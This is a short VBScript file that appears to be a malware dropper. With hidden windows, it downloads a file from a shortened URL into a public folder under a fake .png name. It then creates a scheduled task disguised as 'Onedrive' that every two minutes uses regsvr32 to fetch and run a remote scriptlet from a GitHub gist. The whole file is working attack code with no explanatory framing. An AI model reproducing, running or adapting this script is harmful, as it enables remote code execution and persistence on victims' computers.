Dim objShell
Set objShell = CreateObject("WScript.Shell")
command2 = "powershell -Command `Invoke-WebRequest https://bit.ly/2HlAKjV -OutFile C:\Users\Public\Music\one.png"
command3 = "cmd /c schtasks /create /tn ""Onedrive"" /tr ""regsvr32.exe /s /i:shellcode,https://gist.githubusercontent.com/sparta3407/9d36a87756145bacb27fd330c33830ab/raw/98b848d216a41200e8b713ee42e4a62e13620d9e/microsoft C:\Users\Public\Music\one.png"" /sc minute /mo 2 /F"
objShell.Run command2,0
objShell.Run command3,0
Set objShell = Nothing
